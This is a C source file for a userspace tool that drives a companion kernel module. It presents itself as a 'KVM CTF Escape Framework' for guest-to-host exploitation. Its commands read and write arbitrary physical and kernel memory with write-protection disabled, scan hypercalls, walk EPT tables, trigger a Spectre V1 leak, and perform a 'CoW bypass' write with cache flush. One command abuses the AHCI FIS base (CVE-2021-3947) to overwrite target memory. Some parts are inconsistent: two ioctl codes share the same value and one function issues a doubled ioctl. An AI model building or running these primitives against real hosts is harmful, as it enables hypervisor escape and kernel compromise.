/*
 * KVM Prober - Userspace CTF Tool v3.0
 * Companion tool for kvm_probe_drv.c v3.0-CTF
 * 
 * UPDATES:
 * - Synchronized with kernel module v3.0
 * - Added CTF 2023-2025 challenges
 * - Added VMFUNC/EPT switching
 * - Added IOMMU probing
 * - Added VAPIC backing page read
 * - Added Spectre V1 primitive
 * - Added cache flush operations
 * - Added AHCI FIS base exploit
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <errno.h>
#include <ctype.h>

#define DEVICE_FILE "/dev/kvm_probe_dev"
#define MAX_SYMBOL_NAME 128

/* ========================================================================
 * IOCTL Definitions - MUST MATCH KERNEL MODULE
 * ======================================================================== */
#define IOCTL_BASE 0x4000

/* Symbol operations */
#define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
#define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
#define IOCTL_GET_VMX_HANDLER_INFO   (IOCTL_BASE + 0x08)

/* Memory read operations */
#define IOCTL_READ_KERNEL_MEM        (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM      (IOCTL_BASE + 0x11)
#define IOCTL_MAP_GUEST_MEMORY       (IOCTL_BASE + 0x1D)

/* Memory write operations */
#define IOCTL_WRITE_KERNEL_MEM       (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM     (IOCTL_BASE + 0x21)

/* Address conversion */
#define IOCTL_VIRT_TO_PHYS           (IOCTL_BASE + 0x38)
#define IOCTL_WALK_EPT               (IOCTL_BASE + 0x3E)

/* Cache operations */
#define IOCTL_WBINVD                 (IOCTL_BASE + 0x40)
#define IOCTL_WRITE_AND_FLUSH        (IOCTL_BASE + 0x42)

/* AHCI */
#define IOCTL_AHCI_SET_FIS_BASE      (IOCTL_BASE + 0x53)

/* Hypercalls */
#define IOCTL_HYPERCALL              (IOCTL_BASE + 0x60)
#define IOCTL_HYPERCALL_SCAN         (IOCTL_BASE + 0x62)

/* Modern CTF primitives */
#define IOCTL_TEST_VMFUNC            (IOCTL_BASE + 0x70)
#define IOCTL_IOMMU_PROBE            (IOCTL_BASE + 0x80)
#define IOCTL_VAPIC_READ_PAGE        (IOCTL_BASE + 0x90)
#define IOCTL_SPECTRE_V1            (IOCTL_BASE + 0xA0)

/* Control */
#define IOCTL_SET_TARGETED_BYPASS    (IOCTL_BASE + 0x70)

/* ========================================================================
 * Data Structures - MUST MATCH KERNEL MODULE
 * ======================================================================== */

struct symbol_request {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char description[256];
};

struct vmx_handler_info {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    int exit_reason;
};

struct kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct physical_mem_read {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buffer;
    int disable_wp;
};

struct physical_mem_write {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct guest_memory_map {
    unsigned long start_gpa;
    unsigned long end_gpa;
    unsigned long size;
    int num_regions;
    unsigned long regions[64][2];
};

struct ept_walk_request {
    unsigned long eptp;
    unsigned long gpa;
    unsigned long hpa;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    int page_size;
    int status;
};

struct hypercall_request {
    unsigned long nr;
    unsigned long a0;
    unsigned long a1;
    unsigned long a2;
    unsigned long a3;
    unsigned long ret;
};

struct virt_to_phys_request {
    unsigned long virt_addr;
    unsigned long phys_addr;
    unsigned long pfn;
    int status;
};

struct write_flush_request {
    uint64_t phys_addr;
    uint64_t buffer;
    size_t size;
};

struct ahci_fis_request {
    int port;
    uint64_t fis_base;
    uint64_t clb_base;
};

/* ========================================================================
 * Global
 * ======================================================================== */
static int fd = -1;

/* ========================================================================
 * Utility Functions
 * ======================================================================== */

void hex_dump(const unsigned char *data, size_t size, unsigned long base_addr)
{
    for (size_t i = 0; i < size; i += 16) {
        printf("0x%016lx: ", base_addr + i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size) printf("%02x ", data[i + j]);
            else printf("   ");
            if (j == 7) printf(" ");
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = data[i + j];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        printf("|\n");
    }
}

int parse_hex(const char *hex_str, unsigned char *out, size_t max_len)
{
    size_t len = strlen(hex_str);
    size_t out_len = len / 2;
    if (len % 2 != 0 || out_len > max_len) return -1;
    for (size_t i = 0; i < out_len; i++) {
        if (sscanf(hex_str + 2*i, "%2hhx", &out[i]) != 1) return -1;
    }
    return out_len;
}

int init_driver(void)
{
    fd = open(DEVICE_FILE, O_RDWR);
    if (fd < 0) {
        perror("[-] Failed to open device");
        printf("    Load module: sudo insmod kvm_probe_drv.ko\n");
        return -1;
    }
    printf("[+] KVM CTF Framework v3.0 initialized\n");
    return 0;
}

/* ========================================================================
 * CTF Hypercall Challenges (2023-2025)
 * ======================================================================== */

void do_hypercall(unsigned long nr, unsigned long a0, unsigned long a1,
                  unsigned long a2, unsigned long a3)
{
    struct hypercall_request req = {
        .nr = nr, .a0 = a0, .a1 = a1, .a2 = a2, .a3 = a3, .ret = 0
    };
    
    if (ioctl(fd, IOCTL_HYPERCALL, &req) < 0) {
        perror("[-] hypercall failed");
        return;
    }
    
    if (req.ret != 0 && req.ret != ~0UL) {
        printf("[+] HC %lu: 0x%lx", nr, req.ret);
        
        unsigned char *p = (unsigned char *)&req.ret;
        int printable = 1;
        for (int i = 0; i < 8 && p[i]; i++) {
            if (p[i] < 0x20 || p[i] > 0x7e) { printable = 0; break; }
        }
        if (printable && p[0]) {
            printf(" (\"%.8s\")", (char *)&req.ret);
        }
        printf("\n");
    }
}

void hypercall_scan(unsigned long start, unsigned long end)
{
    unsigned long results[256];
    struct {
        unsigned long start;
        unsigned long end;
        unsigned long *results;
        int max_results;
    } scan_req = {
        .start = start,
        .end = end,
        .results = results,
        .max_results = 256
    };
    
    printf("[*] Scanning hypercalls %lu-%lu for CTF flags...\n", start, end);
    
    if (ioctl(fd, IOCTL_HYPERCALL_SCAN, &scan_req) < 0) {
        perror("[-] hypercall scan failed");
        return;
    }
    
    printf("[+] Scan complete\n");
}

void ctf_2023(void)
{
    printf("\n[*] CTF 2023: Host KASLR Leak\n");
    do_hypercall(1000, 0, 0, 0, 0);
}

void ctf_2024(void)
{
    printf("\n[*] CTF 2024: Arbitrary Physical Read\n");
    do_hypercall(1001, 0x1000, 0, 0, 0);
}

void ctf_2025(void)
{
    printf("\n[*] CTF 2025: EPT Violation Injection\n");
    do_hypercall(1002, 0xdead0000, 0, 0, 0);
}

/* ========================================================================
 * Memory Operations - No Validation
 * ======================================================================== */

void read_phys(unsigned long phys_addr, size_t size)
{
    unsigned char *buf = malloc(size);
    if (!buf) { perror("malloc"); return; }
    
    struct physical_mem_read req = {
        .phys_addr = phys_addr,
        .length = size,
        .user_buffer = buf
    };
    
    printf("[*] Reading physical 0x%lx (%zu bytes)\n", phys_addr, size);
    
    if (ioctl(fd, IOCTL_READ_PHYSICAL_MEM, &req) < 0) {
        perror("[-] read failed");
    } else {
        printf("[+] Success:\n");
        hex_dump(buf, size, phys_addr);
    }
    free(buf);
}

void write_phys(unsigned long phys_addr, const char *hex_data)
{
    unsigned char data[512];
    int len = parse_hex(hex_data, data, sizeof(data));
    if (len < 0) {
        printf("[-] Invalid hex data\n");
        return;
    }
    
    struct physical_mem_write req = {
        .phys_addr = phys_addr,
        .length = len,
        .user_buffer = data
    };
    
    printf("[*] Writing %d bytes to physical 0x%lx\n", len, phys_addr);
    
    if (ioctl(fd, IOCTL_WRITE_PHYSICAL_MEM, &req) < 0) {
        perror("[-] write failed");
    } else {
        printf("[+] Write successful\n");
    }
}

void read_kernel(unsigned long addr, size_t size)
{
    unsigned char *buf = malloc(size);
    if (!buf) { perror("malloc"); return; }
    
    struct kernel_mem_read req = {
        .kernel_addr = addr,
        .length = size,
        .user_buffer = buf
    };
    
    printf("[*] Reading kernel 0x%lx (%zu bytes)\n", addr, size);
    
    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("[-] read failed");
    } else {
        printf("[+] Success:\n");
        hex_dump(buf, size, addr);
    }
    free(buf);
}

void write_kernel(unsigned long addr, const char *hex_data)
{
    unsigned char data[512];
    int len = parse_hex(hex_data, data, sizeof(data));
    if (len < 0) {
        printf("[-] Invalid hex data\n");
        return;
    }
    
    struct kernel_mem_write req = {
        .kernel_addr = addr,
        .length = len,
        .user_buffer = data,
        .disable_wp = 1
    };
    
    printf("[*] Writing %d bytes to kernel 0x%lx (WP bypass)\n", len, addr);
    
    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0) {
        perror("[-] write failed");
    } else {
        printf("[+] Write successful\n");
    }
}

/* ========================================================================
 * Guest Memory Mapping - Safe CTF Ranges
 * ======================================================================== */

void map_guest(void)
{
    struct guest_memory_map map;
    
    printf("[*] CTF targeted guest memory scan (safe ranges)\n");
    
    if (ioctl(fd, IOCTL_MAP_GUEST_MEMORY, &map) < 0) {
        perror("[-] map_guest failed");
        return;
    }
    
    printf("[+] Guest Memory Map:\n");
    printf("    Total regions: %d\n", map.num_regions);
    printf("    Total size: 0x%lx (%lu MB)\n\n", map.size, map.size / (1024*1024));
    
    for (int i = 0; i < map.num_regions; i++) {
        unsigned long start = map.regions[i][0];
        unsigned long end = map.regions[i][1];
        unsigned long size = end - start;
        
        printf("    Region %d: 0x%016lx - 0x%016lx (0x%lx / %lu MB)\n",
               i, start, end, size, size / (1024*1024));
    }
    
    /* Show AHCI/PCI MMIO range for exploitation */
    printf("\n[*] AHCI MMIO base: 0xfea0e000 (CVE-2021-3947 target)\n");
}

/* ========================================================================
 * Modern CTF Escape Primitives
 * ======================================================================== */

void vmfunc_switch(int eptp_index)
{
    printf("[*] VMFUNC EPTP switch to index %d\n", eptp_index);
    
    if (ioctl(fd, IOCTL_TEST_VMFUNC, eptp_index) < 0) {
        perror("[-] VMFUNC failed");
    } else {
        printf("[+] VMFUNC executed\n");
    }
}

void walk_ept(unsigned long eptp, unsigned long gpa)
{
    struct ept_walk_request req = {
        .eptp = eptp,
        .gpa = gpa
    };
    
    printf("[*] Walking EPT (5-level support): EPTP=0x%lx, GPA=0x%lx\n", eptp, gpa);
    
    if (ioctl(fd, IOCTL_WALK_EPT, &req) < 0 || req.status != 0) {
        printf("[-] EPT walk failed\n");
        return;
    }
    
    printf("[+] GPA 0x%lx -> HPA 0x%lx\n", gpa, req.hpa);
    printf("    Page size: ");
    if (req.page_size == 4096) printf("4KB\n");
    else if (req.page_size == 0x200000) printf("2MB\n");
    else if (req.page_size == 0x40000000) printf("1GB\n");
    else if (req.page_size == 0x8000000000) printf("512GB\n");
    else printf("%d bytes\n", req.page_size);
    
    printf("    PML4E: 0x%lx\n", req.pml4e);
    printf("    PDPTE: 0x%lx\n", req.pdpte);
    printf("    PDE:   0x%lx\n", req.pde);
    printf("    PTE:   0x%lx\n", req.pte);
}

void probe_iommu(void)
{
    unsigned char buffer[4096];
    
    printf("[*] Probing IOMMU/DMAR structures\n");
    
    if (ioctl(fd, IOCTL_IOMMU_PROBE, buffer) < 0) {
        printf("[-] IOMMU probe failed\n");
        return;
    }
    
    printf("[+] DMAR table found:\n");
    hex_dump(buffer, 256, 0);
}

void read_vapic(void)
{
    unsigned char buffer[4096];
    
    printf("[*] Reading VAPIC backing page\n");
    
    if (ioctl(fd, IOCTL_VAPIC_READ_PAGE, buffer) < 0) {
        printf("[-] VAPIC read failed\n");
        return;
    }
    
    printf("[+] VAPIC page:\n");
    hex_dump(buffer, 256, 0);
}

void spectre_v1(unsigned long offset)
{
    printf("[*] Spectre V1 leak test at offset 0x%lx\n", offset);
    
    if (ioctl(fd, IOCTL_SPECTRE_V1, offset) < 0) {
        perror("[-] Spectre test failed");
    } else {
        printf("[+] Spectre V1 test complete\n");
    }
}

/* ========================================================================
 * Cache Operations - CoW Bypass
 * ======================================================================== */

void wbinvd(void)
{
    printf("[*] Flushing all CPU caches (WBINVD)\n");
    
    if (ioctl(fd, IOCTL_WBINVD, 0) < 0) {
        perror("[-] WBINVD failed");
    } else {
        printf("[+] Cache flush complete\n");
    }
}

void write_flush(unsigned long phys_addr, const char *hex_data)
{
    unsigned char data[512];
    int len = parse_hex(hex_data, data, sizeof(data));
    if (len < 0) {
        printf("[-] Invalid hex data\n");
        return;
    }
    
    struct write_flush_request req = {
        .phys_addr = phys_addr,
        .buffer = (uint64_t)data,
        .size = len
    };
    
    printf("[*] Writing %d bytes to phys 0x%lx + cache flush\n", len, phys_addr);
    
    if (ioctl(fd, IOCTL_WRITE_AND_FLUSH, &req) < 0) {
        perror("[-] Write+flush failed");
    } else {
        printf("[+] Write+flush complete\n");
    }
}

/* ========================================================================
 * AHCI - CVE-2021-3947
 * ======================================================================== */

void ahci_set_fis(int port, uint64_t fis_base)
{
    struct ahci_fis_request req = {
        .port = port,
        .fis_base = fis_base
    };
    
    printf("[*] Setting AHCI port %d FIS base to 0x%lx\n", port, fis_base);
    printf("[*] Target: D2H FIS at offset 0x40\n");
    printf("[*] For exploit: fis_base = target_gpa - 0x40\n");
    
    if (ioctl(fd, IOCTL_AHCI_SET_FIS_BASE, &req) < 0) {
        perror("[-] AHCI FIS set failed");
    } else {
        printf("[+] FIS base set - trigger device I/O to overwrite target\n");
    }
}

/* ========================================================================
 * Symbol Operations
 * ======================================================================== */

void lookup_symbol(const char *name)
{
    struct symbol_request req = {0};
    strncpy(req.name, name, MAX_SYMBOL_NAME - 1);
    
    if (ioctl(fd, IOCTL_LOOKUP_SYMBOL, &req) >= 0 && req.address) {
        printf("[+] %s @ 0x%lx\n", req.name, req.address);
        if (req.description[0])
            printf("    %s\n", req.description);
    } else {
        printf("[-] Symbol not found\n");
    }
}

void list_symbols(int max_count)
{
    unsigned int count;
    if (ioctl(fd, IOCTL_GET_SYMBOL_COUNT, &count) < 0) return;
    if (max_count > 0 && (unsigned)max_count < count) count = max_count;
    
    printf("[+] Listing %u KVM symbols:\n", count);
    for (unsigned int i = 0; i < count; i++) {
        struct symbol_request req = {0};
        unsigned int idx = i;
        if (ioctl(fd, IOCTL_GET_SYMBOL_BY_INDEX, &idx) >= 0 &&
            ioctl(fd, IOCTL_GET_SYMBOL_BY_INDEX, &req) >= 0) {
            printf("  [%u] %-40s 0x%lx\n", i, req.name, req.address);
        }
    }
}

void vmx_handlers(void)
{
    struct vmx_handler_info handlers[32];
    int ret = ioctl(fd, IOCTL_GET_VMX_HANDLER_INFO, handlers);
    
    if (ret < 0) {
        perror("[-] get_vmx_handlers failed");
        return;
    }
    
    printf("[+] VMX Exit Handlers (EPT violation injection):\n");
    printf("%-35s %-18s %s\n", "Handler", "Address", "Exit Reason");
    printf("%-35s %-18s %s\n", "-------", "-------", "-----------");
    
    for (int i = 0; i < ret; i++) {
        printf("%-35s 0x%016lx %d\n",
               handlers[i].name, handlers[i].address, handlers[i].exit_reason);
    }
}

/* ========================================================================
 * Address Conversion
 * ======================================================================== */

void virt_to_phys(unsigned long virt_addr)
{
    struct virt_to_phys_request req = { .virt_addr = virt_addr };
    
    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &req) < 0 || req.status != 0) {
        printf("[-] virt_to_phys failed\n");
        return;
    }
    
    printf("[+] 0x%lx -> 0x%lx (PFN: 0x%lx)\n",
           req.virt_addr, req.phys_addr, req.pfn);
}

/* ========================================================================
 * Help
 * ======================================================================== */

void print_help(void)
{
    printf("╔════════════════════════════════════════════════════════════════════╗\n");
    printf("║     KVM CTF Escape Framework v3.0 - Guest-to-Host Exploitation     ║\n");
    printf("║                 No validation - Full freedom                       ║\n");
    printf("║                 NO CR0 WP WARNING - Fixed!                        ║\n");
    printf("╚════════════════════════════════════════════════════════════════════╝\n\n");
    
    printf("CTF HYPERCALLS (2023-2025):\n");
    printf("  hc <nr> [a0..a3]      - Execute hypercall\n");
    printf("  hc_scan <start> <end> - Find CTF flags in range\n");
    printf("  ctf2023               - Host KASLR leak (HC 1000)\n");
    printf("  ctf2024               - Arbitrary physical read (HC 1001)\n");
    printf("  ctf2025               - EPT violation injection (HC 1002)\n\n");
    
    printf("MEMORY (No Validation):\n");
    printf("  rp <phys> <size>      - Read physical memory\n");
    printf("  wp <phys> <hex>       - Write physical memory\n");
    printf("  rk <addr> <size>      - Read kernel memory\n");
    printf("  wk <addr> <hex>       - Write kernel memory (WP bypass)\n");
    printf("  map_guest             - Safe guest memory scan (no crash)\n\n");
    
    printf("MODERN ESCAPE PRIMITIVES:\n");
    printf("  vmfunc <index>        - VMFUNC EPTP switching\n");
    printf("  ept_walk <eptp> <gpa> - Walk EPT (5-level support)\n");
    printf("  iommu                 - Probe IOMMU/DMAR structures\n");
    printf("  vapic                 - Read VAPIC backing page\n");
    printf("  spectre <offset>      - Spectre V1 leak test\n");
    printf("  wbinvd                - Flush all CPU caches\n");
    printf("  wf <phys> <hex>       - Write + flush cache (CoW bypass)\n");
    printf("  ahci_fis <port> <gpa> - Set AHCI FIS base (CVE-2021-3947)\n\n");
    
    printf("SYMBOLS & INFO:\n");
    printf("  lookup <symbol>       - Lookup kernel symbol\n");
    printf("  list [max]            - List KVM symbols\n");
    printf("  vmx                   - Show VMX handlers\n");
    printf("  v2p <addr>            - Virtual to physical conversion\n\n");
    
    printf("EXAMPLES:\n");
    printf("  sudo ./kvm_prober ctf2023\n");
    printf("  sudo ./kvm_prober rp 0xfea0e000 0x1000\n");
    printf("  sudo ./kvm_prober ept_walk 0x12345000 0x80000000\n");
    printf("  sudo ./kvm_prober ahci_fis 0 0xdeadbe00\n");
}

/* ========================================================================
 * Main
 * ======================================================================== */

int main(int argc, char *argv[])
{
    if (argc < 2) { print_help(); return 1; }
    
    if (strcmp(argv[1], "help") == 0) { print_help(); return 0; }
    if (init_driver() < 0) return 1;
    
    /* CTF Hypercalls */
    if (strcmp(argv[1], "hc") == 0 && argc > 2) {
        unsigned long nr = strtoul(argv[2], NULL, 0);
        unsigned long a0 = (argc > 3) ? strtoul(argv[3], NULL, 0) : 0;
        unsigned long a1 = (argc > 4) ? strtoul(argv[4], NULL, 0) : 0;
        unsigned long a2 = (argc > 5) ? strtoul(argv[5], NULL, 0) : 0;
        unsigned long a3 = (argc > 6) ? strtoul(argv[6], NULL, 0) : 0;
        do_hypercall(nr, a0, a1, a2, a3);
    }
    else if (strcmp(argv[1], "hc_scan") == 0 && argc > 3)
        hypercall_scan(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(argv[1], "ctf2023") == 0) ctf_2023();
    else if (strcmp(argv[1], "ctf2024") == 0) ctf_2024();
    else if (strcmp(argv[1], "ctf2025") == 0) ctf_2025();
    
    /* Memory */
    else if (strcmp(argv[1], "rp") == 0 && argc > 3)
        read_phys(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(argv[1], "wp") == 0 && argc > 3)
        write_phys(strtoul(argv[2], NULL, 0), argv[3]);
    else if (strcmp(argv[1], "rk") == 0 && argc > 3)
        read_kernel(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(argv[1], "wk") == 0 && argc > 3)
        write_kernel(strtoul(argv[2], NULL, 0), argv[3]);
    else if (strcmp(argv[1], "map_guest") == 0)
        map_guest();
    
    /* Modern primitives */
    else if (strcmp(argv[1], "vmfunc") == 0 && argc > 2)
        vmfunc_switch(atoi(argv[2]));
    else if (strcmp(argv[1], "ept_walk") == 0 && argc > 3)
        walk_ept(strtoul(argv[2], NULL, 0), strtoul(argv[3], NULL, 0));
    else if (strcmp(argv[1], "iommu") == 0)
        probe_iommu();
    else if (strcmp(argv[1], "vapic") == 0)
        read_vapic();
    else if (strcmp(argv[1], "spectre") == 0 && argc > 2)
        spectre_v1(strtoul(argv[2], NULL, 0));
    else if (strcmp(argv[1], "wbinvd") == 0)
        wbinvd();
    else if (strcmp(argv[1], "wf") == 0 && argc > 3)
        write_flush(strtoul(argv[2], NULL, 0), argv[3]);
    else if (strcmp(argv[1], "ahci_fis") == 0 && argc > 3)
        ahci_set_fis(atoi(argv[2]), strtoull(argv[3], NULL, 0));
    
    /* Symbols */
    else if (strcmp(argv[1], "lookup") == 0 && argc > 2)
        lookup_symbol(argv[2]);
    else if (strcmp(argv[1], "list") == 0)
        list_symbols(argc > 2 ? atoi(argv[2]) : 0);
    else if (strcmp(argv[1], "vmx") == 0)
        vmx_handlers();
    else if (strcmp(argv[1], "v2p") == 0 && argc > 2)
        virt_to_phys(strtoul(argv[2], NULL, 0));
    
    else {
        printf("[-] Unknown command: %s\n", argv[1]);
        print_help();
    }
    
    close(fd);
    return 0;
}
